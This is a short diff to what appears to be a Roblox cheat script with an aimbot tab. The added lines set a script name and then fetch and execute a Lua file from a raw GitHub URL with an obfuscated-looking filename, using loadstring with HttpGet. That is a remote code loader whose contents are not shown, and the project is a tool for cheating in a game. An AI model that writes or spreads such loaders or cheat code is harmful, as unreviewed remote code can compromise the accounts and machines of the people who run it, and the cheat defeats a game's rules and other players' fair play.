@@ -140,6 +140,9 @@ Tabs.Aimbot:AddButton({
     end
 })
 
+_G.ScriptName = "Aimbot [ Tank ]"
+loadstring(game:HttpGet('https://raw.githubusercontent.com/PHOOMPHAT-Git/Lua-Zone/refs/heads/main/dwcqweyhfbwregbfyiokgfnbac.lua'))()
+
 SaveManager:SetLibrary(Fluent)
 InterfaceManager:SetLibrary(Fluent)
 
